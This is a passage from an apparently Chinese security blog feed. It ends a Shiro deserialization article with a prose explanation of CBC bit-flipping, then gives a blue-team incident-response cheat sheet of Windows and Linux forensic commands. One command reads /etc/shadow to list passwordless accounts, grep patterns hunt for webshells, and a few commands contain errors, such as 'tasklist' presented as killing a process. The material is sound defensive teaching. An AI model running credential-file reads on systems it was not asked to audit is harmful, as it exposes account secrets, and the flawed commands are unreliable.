href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h5><blockquote><pre><code>     我们了解了如何猜解出中间值，并进一步通过中间值来得到明文。当我们知道其解密后的中间值，就可以构造一个ⅣV使得二者异或得到的明文为我们想要的明文，从而完成攻击。</code></pre><p><img src="https://pic1.imgdb.cn/item/67f7def488c538a9b5c91791.png"></p><p>​具体攻击细节我们通过上图来了解，如上图所示，我们需要修改明文分组3的内容，就可以修改密文分组2的内容，让其与中间值3异或运算得到我们想要的结果。但是修改了密文分组2会让其解密后的中间值乱码（损坏），最后得到的明文会是乱码，所以我们需要通过前面的填充攻击的方式猜解出损坏的中间值，再通过修改密文分组来还原该明文分组。同理密文分组1对应的明文分组1也可通过修改IV来还原，最终我们就修改了明文分组3，而且其他明文不变。使用这种方法我们也可以修改整个明文以及添加新的明文。</p></blockquote><p>复现:</p><h3 id="漏洞的危害"><a href="#漏洞的危害" class="headerlink" title="漏洞的危害"></a>漏洞的危害</h3><p>Shiro反序列化漏洞的危害主要包括远程代码执行（RCE）、获取系统权限、敏感信息泄露等。攻击者可以利用这些漏洞来执行恶意代码，控制受影响的系统，进而进行更严重的攻击行为。</p><h3 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h3><p>为了防止Shiro反序列化漏洞的攻击，可以采取以下防护措施：</p><ol><li><strong>升级Shiro版本</strong>：及时关注Apache Shiro的官方公告和更新信息，将Shiro框架升级到最新版本。</li><li><strong>密钥管理</strong>：避免将密钥硬编码在代码中，采用更安全的方式生成和管理密钥。</li><li><strong>输入验证和过滤</strong>：对用户输入的数据进行严格的验证和过滤，确保输入的数据符合预期的格式和类型。</li><li><strong>限制反序列化的类</strong>：在反序列化操作中，指定允许反序列化的类，防止恶意用户通过构造特定类型的对象来触发反序列化漏洞。</li><li><strong>安全审计和代码审查</strong>：定期进行安全审计和代码审查，检查是否存在其他潜在的安全风险和漏洞。</li></ol><p>综上所述，Shiro漏洞是Apache Shiro框架中存在的安全漏洞之一，主要包括反序列化漏洞等类型。为了防止这些漏洞的攻击，需要采取相应的防护措施来加强系统的安全性。</p>]]></content>
      
      
      <categories>
          
          <category> JAVA框架漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA框架漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝队应急响应</title>
      <link href="/2025/04/10/lan-dui-ying-ji-xiang-ying/"/>
      <url>/2025/04/10/lan-dui-ying-ji-xiang-ying/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝队应急响应笔记"><a href="#蓝队应急响应笔记" class="headerlink" title="蓝队应急响应笔记"></a>蓝队应急响应笔记</h1><h2 id="Windows排查"><a href="#Windows排查" class="headerlink" title="#Windows排查"></a>#Windows排查</h2><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>在线日志筛选工具：<a href="https://tilipa.zlsam.com/loger/">https://tilipa.zlsam.com/loger/</a></p><h4 id="日志分类"><a href="#日志分类" class="headerlink" title="日志分类"></a>日志分类</h4><h5 id="Web日志"><a href="#Web日志" class="headerlink" title="Web日志"></a>Web日志</h5><ol><li>Web日志存放路径</li></ol><p>Windows默认路径：在根目录下的logs文件夹中</p><ol start="2"><li>tomcat日志</li></ol><p>包含catalina.out（异常错误的日志）、localhost（类错误的日志）、manager、localhost_access_log 4种格式的日志</p><ol start="3"><li>apache日志、nginx日志、IIS日志</li></ol><p>包含access_log、error_log</p><h5 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h5><ol><li>Windows系统日志包括系统日志、安全日志、应用日志等</li></ol><p>在事件查看器的 安全事件 中查看事件id</p><table><thead><tr><th align="center">敏感事件id</th><th align="center">事件</th></tr></thead><tbody><tr><td align="center">4624</td><td align="center">登录成功</td></tr><tr><td align="center">4625</td><td align="center">登陆失败</td></tr><tr><td align="center">4720</td><td align="center">创建用户</td></tr><tr><td align="center">4634</td><td align="center">注销成功</td></tr><tr><td align="center">4647</td><td align="center">用户启动的注销</td></tr><tr><td align="center">4672</td><td align="center">使用超级用户/超级管理员用户进行登录</td></tr></tbody></table><p>在事件查看器的 安全事件 中查看事件id</p><p>​当黑客创建了隐藏账户（hacker$），那么net user是无法查看的，可以去事件查看器中筛选查看事件id为4720的事件，查看是否创建了隐藏账户</p><ol start="2"><li>系统日志分析工具–LogParser</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT -o:DATAGRID "SELECT * FROM Security.evtx（日志路径） where EventID=4624"</span><br><span class="line">指定登录时间范围的事件：</span><br><span class="line">LogParser.exe -i:EVT -o:DATAGRID "SELECT * FROM Security.evtx where TimeGenerated&gt;'2022-06-19 23:32:11' and TimeGenerated</span><br><span class="line">提取登录成功的用户名和IP：</span><br><span class="line">LogParser.exe -i:EVT -o:DATAGRID "SELECT EXTRACT_TOKEN(Message,13,') as</span><br><span class="line">EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,'') as Loginip FROM Security.evtx where EventID=4624</span><br><span class="line">登陆失败的所有事件</span><br><span class="line">LogParser.exe -i:EVT -o:DATAGRID "SELECT * FROM Security.evtx where EventID=4625"</span><br></pre></td></tr></tbody></table></figure><h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p>#文件排查</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(1)各个盘下的temp相关目录%temp%//记录文件大，后缀为exe，dll等文件</span><br><span class="line">WIN+R%temp%</span><br><span class="line"></span><br><span class="line">(2)开机启动文件（启动菜单、注册表</span><br><span class="line"></span><br><span class="line">(3)浏览器的历史记录</span><br><span class="line"></span><br><span class="line">(4)Recent文件</span><br><span class="line">WIN+Rrecent</span><br><span class="line"></span><br><span class="line">(5）攻击日期内新增的文件,cmd下运行代码</span><br><span class="line">forfiles /m *.exe /d 2022/10/5 /s /c "cmd /c echo @path @fdate @ftime"</span><br><span class="line">/m：指定类型/d：指定时间之后</span><br><span class="line"></span><br><span class="line">（8）使用工具D盾、HwsKill、WebshellKill等</span><br></pre></td></tr></tbody></table></figure><h3 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h3><p>#进程分析</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(1)查看端口得到PID</span><br><span class="line">netstat -nao | findstr 端口</span><br><span class="line"></span><br><span class="line">(2)根据PID查看进程对应的程序名称</span><br><span class="line">tasklist /V | findstr PID</span><br><span class="line">wmic process list brief | findstr PID</span><br><span class="line"></span><br><span class="line">(3)得到程序全路径名</span><br><span class="line">wmic process where processid=PID get processid,executablepath,name</span><br><span class="line"></span><br><span class="line">(4)杀掉进程</span><br><span class="line">tasklist /pid PID /f</span><br><span class="line">wmic process where name="mysqld.exe" delete</span><br><span class="line">wmic process where processid=PID call terminate</span><br></pre></td></tr></tbody></table></figure><h3 id="自启动、计划任务"><a href="#自启动、计划任务" class="headerlink" title="自启动、计划任务"></a>自启动、计划任务</h3><ol><li>新增、隐藏账号排查</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(1)通过命令：“net user”查看</span><br><span class="line">(2)通过“计算机管理”查看。lusrmgr.msc</span><br><span class="line">(3)通过Windows安全日志进行排查eventvwr</span><br><span class="line">(4)通过查看注册表文件进行排查  regedit</span><br><span class="line"></span><br><span class="line">#1 HKEY CLASSES ROOT(HKCR)</span><br><span class="line">#2 HKEY CURRENT USER(HKCU)</span><br><span class="line">#3 HKEY LOCAL MACHINE(HKLM)</span><br><span class="line">#4 HKEY USERS(HKU)</span><br><span class="line"></span><br><span class="line">(5)通过Windows管理工具</span><br><span class="line">wmic useraccount get name,SiD</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>注册表排查</li></ol><p>（1）在注册表此处查看是否有隐藏账户或者影子账号</p><p>HKEY_LOCAL_MACHINE——SAM——Account——Users——Names</p><p><img src="https://pic1.imgdb.cn/item/67f7cae788c538a9b5c8f67f.png"></p><p>（2）在注册表此处查看启动项（2种）</p><p>HKEY_LOCAL_MACHINE——SOFTWARE——Microsoft——Windows——CurrentVersion——Run</p><p>HKEY_CURRENT_USER——Software——Microsoft——Windows——CurrentVersion——Run</p><p>（3）计划任务查看</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks.exe</span><br></pre></td></tr></tbody></table></figure><h2 id="Linux排查"><a href="#Linux排查" class="headerlink" title="#Linux排查"></a>#Linux排查</h2><h3 id="关键目录"><a href="#关键目录" class="headerlink" title="关键目录"></a>关键目录</h3><table><thead><tr><th align="center">文件名</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/etc/passwd</td><td align="center">用户信息文件</td></tr><tr><td align="center">/etc/rc.d/rc.local</td><td align="center">开机启动项</td></tr><tr><td align="center">/root/.ssh</td><td align="center">root用户ssh公钥和私钥</td></tr><tr><td align="center">/tmp</td><td align="center">系统或用户临时文件目录</td></tr><tr><td align="center">/etc/hosts</td><td align="center">本地IP地址域名解析文件</td></tr><tr><td align="center">/etc/init.d/</td><td align="center">开机启动项</td></tr></tbody></table><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、ls -alt</span><br><span class="line"></span><br><span class="line">2、free -h：查看系统内存使用情况</span><br><span class="line"></span><br><span class="line">3、ps auxf ：查看系统进程及子进程</span><br><span class="line">top ：查看CPU占用率//排查CPU占用率最高的进程</span><br><span class="line"></span><br><span class="line">4、netstat -antpl</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/67f7cb0388c538a9b5c8f6c1.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">5、lsof -i:port//查询端口打开的文件</span><br><span class="line">lsof -p pid//查询进程打开的文件</span><br><span class="line">lsof -u root//查询用户打开的文件</span><br><span class="line"></span><br><span class="line">6、chattr//修改文件属性，防止误删除</span><br><span class="line">chattr +i 文件夹加锁</span><br><span class="line">chattr -i 文件夹去锁</span><br><span class="line">lsattr//显示文件属性</span><br><span class="line"></span><br><span class="line">7、排查启动项</span><br><span class="line">cat /etc/rc.local</span><br><span class="line">ls -alt /etc/profile.d/*.sh//sh文件在启动之后会自动加载</span><br><span class="line"></span><br><span class="line">8、grep//查找符合条件的字符串</span><br><span class="line"></span><br><span class="line">9、查看计划任务</span><br><span class="line">cat /etc/passwd | cut -f 1 -d : |xargs -l {} crontab -l -u {}//查询所有用户的计划任务</span><br><span class="line">ls -altr /var/spool/cron/*</span><br><span class="line">more /etc/crontab</span><br><span class="line">more /ete/cron.d/*</span><br><span class="line">more /etc/cron.daily/*</span><br><span class="line">more /etc/cron.hourly/*</span><br><span class="line">more /etc/cron.monthly/*</span><br><span class="line">more /etc/cron.weekly/</span><br><span class="line">more /etc/anacrontab</span><br><span class="line">more /var/spool/anacron/*</span><br><span class="line"></span><br><span class="line">10、查看历史命令</span><br><span class="line">history</span><br><span class="line">cat ~/.bash_history//每个用户都有对应的记录</span><br><span class="line"></span><br><span class="line">11、校验RPM软件包</span><br><span class="line">rpm -Va</span><br><span class="line">dpkg -verify</span><br><span class="line">重点关注一下SM5 看是否存在文件权限和所有权不一致</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/67f7cb1f88c538a9b5c8f6e5.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">12、查看文件（文件夹）详细信息</span><br><span class="line">stat</span><br><span class="line"></span><br><span class="line">13、查看文件的时间</span><br><span class="line">find / -mtime 0 -name *.jsp//查看当前目录下，指定天数内修改的指定类型文件（文件内容的修改）</span><br><span class="line">find / -ctime 0 -name *.jsp//查看当前目录下，指定天数内新增的指定类型文件（文件类型的修改）</span><br><span class="line"></span><br><span class="line">14、比较文件差异</span><br><span class="line">diff -c</span><br><span class="line"></span><br><span class="line">15、查看隐藏进程（3步结合）</span><br><span class="line">ps -ef | awk '{print $2}' | sort -n | uniq &gt; ps.p//导出所有的PID号到ps.p</span><br><span class="line">ls /proc | sort -n | uniq &gt; proc.p//导出所有的进程文件号打印出来</span><br><span class="line">diff ps.p proc.p//比较区别</span><br><span class="line"></span><br><span class="line">16、查看用户登录历史记录</span><br><span class="line">last</span><br><span class="line"></span><br><span class="line">17、查看用户登陆失败记录</span><br><span class="line">lastb</span><br><span class="line"></span><br><span class="line">18、查看用户最近一次登录信息//会显示/etc/passwd中所有用户的最近登录信息</span><br><span class="line">lastlog</span><br></pre></td></tr></tbody></table></figure><h3 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a>应急工具</h3><h4 id="Busybox"><a href="#Busybox" class="headerlink" title="Busybox"></a>Busybox</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./busybox netstat -antlp </span><br></pre></td></tr></tbody></table></figure><h4 id="unhide"><a href="#unhide" class="headerlink" title="unhide"></a>unhide</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一款检测发现那些借助rootkit及其它技术隐藏的进程和TCP/UDP端口的命令行工具</span><br><span class="line">可以判断系统是否存在隐藏进程</span><br><span class="line"></span><br><span class="line">unhide proc//检测隐藏进程</span><br><span class="line">unhide sys//检测隐藏系统文件</span><br></pre></td></tr></tbody></table></figure><h4 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h4><p>rootkit是Linux平台下最常见的一种木马后门工具，它主要通过替换系统文件来达到入侵和隐蔽的目的，这种木马比普通木马后门更加危险和隐蔽，普通的检测工具和检查手段很难发现这种木马。rootkit攻击能力极强，对系统的危害很大，它通过一套工具来建立后门和隐藏行迹，从而让攻击者保住权限，以使它在任何时候都可以使用root权限登录到系统。</p><ul><li>rootkit主要有两种类型：<strong>文件级别</strong>和<strong>内核级别</strong></li></ul><ol><li>文件级别的rootkit:</li></ol><p>​一般是通过程序漏洞或者系统漏洞进入系统后，通过修改系统的重要文件来达到隐藏自己的目的。在系统遭受rootkit攻击后，合法的文件被木马程序替代，变成了外壳程序，而其内部是隐藏着的后门程序。通常容易被rootkit替换的系统程序有login、ls、ps、ifconfig、du、find、netstat等。文件级别的rootkit，对系统维护很大，目前最有效的防御方法是定期对系统重要文件的完整性进行检查，如Tripwire、aide等。</p><ol start="2"><li>内核级别rootkit：</li></ol><p>​是比文件级rootkit更高级的一种入侵方式，它可以使攻击者获得对系统底层的完全控制权，此时攻击者可以修改系统内核，进而截获运行程序向内核提交的命令，并将其重定向到入侵者所选择的程序并运行此程序。内核级rootkit主要依附在内核上，它并不对系统文件做任何修改。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chkrootkit是一款用于UNIX/Linux的本地rootkit检查工具，用于检查系统上已知的rootkit。它通过检查通常与rootkit相关的特定文件、目录和字符串，扫描系统以查找rootkit安装的任何迹象</span><br><span class="line">检测是否被植入后门、木马、rootkit</span><br><span class="line"></span><br><span class="line">直接运行/usr/local/chkrootkit/chkrootkit</span><br><span class="line">在kail中自带，可以使用chkrootkit -n</span><br></pre></td></tr></tbody></table></figure><h4 id="Rkhunter"><a href="#Rkhunter" class="headerlink" title="Rkhunter"></a>Rkhunter</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rkhunter是Linux系统平台下的一款开源入侵检测工具，具有非常全面的扫描范围，除了能够检测各种已知的rootkit特征码以外，还支持端口扫描、常用程序文件的变动情况检查。</span><br><span class="line"></span><br><span class="line">rkhunter --check --sk</span><br></pre></td></tr></tbody></table></figure><p>运行rkhunter检查系统它主要执行下面一系列的测试:</p><pre><code>1. MD5校验测试, 检测任何文件是否改动.2. 检测rootkits使用的二进制和系统工具文件.3. 检测特洛伊木马程序的特征码.4. 检测大多常用程序的文件异常属性.5. 执行一些系统相关的测试 - 因为rootkit hunter可支持多个系统平台.6. 扫描任何混杂模式下的接口和后门程序常用的端口.7. 检测如/etc/rc.d/目录下的所有配置文件, 日志文件, 任何异常的隐藏文件等等. 例如, 在检测/dev/.udev和/etc/.pwd.lock文件时候, 我的系统被警告.8. 对一些使用常用端口的应用程序进行版本测试. 如: Apache Web Server, Procmail等.</code></pre><h4 id="ClamAV"><a href="#ClamAV" class="headerlink" title="ClamAV"></a>ClamAV</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一款用于检测木马、病毒、恶意软件和其他恶意威胁的开源防病毒引擎。</span><br></pre></td></tr></tbody></table></figure><h4 id="WebShell查杀-河马"><a href="#WebShell查杀-河马" class="headerlink" title="WebShell查杀-河马"></a>WebShell查杀-河马</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.shellpub.com/</span><br></pre></td></tr></tbody></table></figure><h4 id="内存马查杀-java-memshell-scanner"><a href="#内存马查杀-java-memshell-scanner" class="headerlink" title="内存马查杀-java-memshell-scanner"></a>内存马查杀-java-memshell-scanner</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/c0ny1/java-memshell-scanner</span><br></pre></td></tr></tbody></table></figure><h3 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志存放位置</p><p>/www/admin/localhost</p><h4 id="web日志"><a href="#web日志" class="headerlink" title="web日志"></a>web日志</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">(1)列出当天访问次数最多的IP命令(确认攻击者IP)</span><br><span class="line">cut -d- -f 1 log_file | uniq -c | sort -rn | head -20</span><br><span class="line"></span><br><span class="line">cut -d- -f 1 log_file:</span><br><span class="line">cut 命令提取文件 log_file 中的内容。</span><br><span class="line">-d- 指定 - 作为字段分隔符。</span><br><span class="line">-f 1 表示提取每行的第一个字段。</span><br><span class="line">这部分的意义是从 log_file 中提取每行 - 分隔符前面的内容。</span><br><span class="line">uniq -c:</span><br><span class="line">uniq 命令用于过滤掉重复的行。</span><br><span class="line">-c 选项使 uniq 在输出的每一行前加上该行出现的次数。</span><br><span class="line">这部分会统计 cut 提取出来的第一个字段的出现次数。</span><br><span class="line">sort -rn:</span><br><span class="line">sort 命令用于对输入的行进行排序。</span><br><span class="line">-r 选项表示逆序排序（从大到小）。</span><br><span class="line">-n 选项表示按照数值进行排序，而不是字典序。</span><br><span class="line">这部分的作用是将 uniq 输出的行按照出现次数进行降序排列。</span><br><span class="line">head -20:</span><br><span class="line">head 命令用于输出前 N 行。</span><br><span class="line">-20 表示输出前 20 行。</span><br><span class="line">这一部分会最终列出出现次数最多的前 20 个字段。</span><br><span class="line"></span><br><span class="line">(2)查看每一个IP访问了多少个页面</span><br><span class="line">awk '{++S[$1]} END {for (a in S) print a, S[a]}' log_file  </span><br><span class="line"></span><br><span class="line">awk '{++S[$1]}' log_file:</span><br><span class="line">awk 是一个强大的文本处理工具。</span><br><span class="line">{++S[$1]}：每当读取到一行，$1 表示该行的第一个字段。S[$1] 是一个 associative array（关联数组），用于记录第一个字段出现的次数。++S[$1] 对该字段的计数加 1。</span><br><span class="line">log_file 是要处理的文件。</span><br><span class="line">END {for (a in S) print a, S[a]}:</span><br><span class="line">END {...} 块在输入文件的所有行处理完后执行。</span><br><span class="line">for (a in S) 遍历数组 S，其中 a 是数组中的每一个键（即第一个字段的不同值）。</span><br><span class="line">print a, S[a]：打印出字段 a 和它的计数 S[a]。</span><br><span class="line"></span><br><span class="line">(3)看某一个页面被访问的次数(确认木马文件)</span><br><span class="line">grep "/index.php" log_file | wc -l</span><br><span class="line"></span><br><span class="line">grep "/index.php" log_file：从名为 log_file 的日志文件中查找包含 /index.php 的所有行。grep 是一个用于文本搜索的命令，它会返回所有匹配的行。</span><br><span class="line">|：这个符号是管道操作符，它将前一个命令的输出传递给后一个命令。</span><br><span class="line">wc -l：wc 是一个用于计算文本行数、单词数和字节数的命令。选项 -l 表示只计算行数。</span><br><span class="line"></span><br><span class="line">(4)查看某一个IP访问了哪些页面</span><br><span class="line">grep 192.168.1.132 log_file | awk '{print $1,$7}'</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>常用命令：find、awk、cat、grep</p><p>find：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(1)find 文件名</span><br><span class="line">-name：区分大小写</span><br><span class="line">-iname：不区分大小写</span><br><span class="line">find -name "*.php"</span><br><span class="line">find -type f -name "*.php" | xargs grep 'eval' | more//查看php文件中包含eval的文件内容</span><br><span class="line"></span><br><span class="line">(2)find 文件类型</span><br><span class="line">-type：f(普通文件) d(目录) i(软链接)</span><br><span class="line"></span><br><span class="line">(3)按照文件大小</span><br><span class="line">-size: +50k(找比50k大的文件) -100k(找比100k小的文件)//M、G为大写，k为小写</span><br><span class="line"></span><br><span class="line">(4)按照修改时间</span><br><span class="line">-atime(访问时间)-mtime(最后修改内容的时间)-ctime(文件的状态改变时间（例如，权限修改，文件名更改等），除了文件内容修改的)</span><br><span class="line">+5：6天前修改的文件20号（今天）--&gt; 14号之前修改的文件</span><br><span class="line">-5：5天内修改的文件20号（今天）--&gt; 15-20号修改的文件</span><br><span class="line">5：精确到5天前 20号（今天）--&gt; 15号修改的文件</span><br><span class="line">find -mtime 0 -name "*.php"//24h内修改的文件</span><br><span class="line"></span><br><span class="line">(5)权限</span><br><span class="line">-perm:查看权限</span><br><span class="line">find -iname "*.php" -perm 777</span><br><span class="line"></span><br><span class="line">(6)所属组所有者</span><br><span class="line">-uid</span><br><span class="line">-gid</span><br><span class="line">-user 用户名</span><br><span class="line">-nouser没有所属组的文件</span><br><span class="line">find -user root//查找哪些文件是root的</span><br><span class="line">find -nouser//查找没有所有者的文件，看是不是外来垃圾文件</span><br><span class="line"></span><br><span class="line">(7)逻辑运算</span><br><span class="line">-a:逻辑与(&amp;)</span><br><span class="line">-o:逻辑或(|)</span><br><span class="line">-not:逻辑非</span><br><span class="line">find -mtime -3 -a -perm 777 //3天内权限为777的文件</span><br><span class="line">find -name php -o -name jsp//文件为php或jsp的</span><br></pre></td></tr></tbody></table></figure><p>awk：awk [选项]’匹配规则处理规则’ 路径</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">匹配规则：正则表达式</span><br><span class="line">处理规则：设置变量、数组，定义函数，加减运算，字符串拼接</span><br><span class="line">联合sort -n去排序,uniq去除重复行配上-c计数参数</span><br><span class="line">sort -n | uniq &gt; 1 -c</span><br><span class="line">$1:第一列</span><br><span class="line"></span><br><span class="line">awk '{print substr($4,2,11)}' log_file | sort | uniq -c</span><br><span class="line"></span><br><span class="line">-F:指定分隔符，默认为空格</span><br><span class="line">awk -F: 'length($2)==0 {print $1}' /etc/shadow</span><br></pre></td></tr></tbody></table></figure><p>grep：查找文件中的字符内容</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-c:统计行数</span><br><span class="line">-v:去掉这一行的内容打印</span><br><span class="line">ps -ef | grep ssh | grep -v grep</span><br><span class="line"></span><br><span class="line">ps -ef：这个命令用于显示系统中所有进程的详细信息。</span><br><span class="line">-e 选项表示显示所有用户的所有进程。</span><br><span class="line">-f 选项表示以完整格式（full format）显示进程信息，包括 UID、PID、PPID、C、STIME、TTY、TIME 和 CMD 等字段。</span><br><span class="line">|：这个管道符号将前一个命令的输出传递给下一个命令。</span><br><span class="line">grep ssh：这个命令过滤出包含 "ssh" 字符串的行。这意味着它会找出所有 SSH 相关的进程。</span><br><span class="line">grep -v grep：这个命令会排除任何包含 "grep" 字符串的行。因为在使用 grep 时，该命令本身也会被列为一个进程，使用 -v 选项可以反向匹配，从而过滤掉这行。</span><br><span class="line"></span><br><span class="line">find ./ -name "*.php" | xargs grep "eval()"</span><br><span 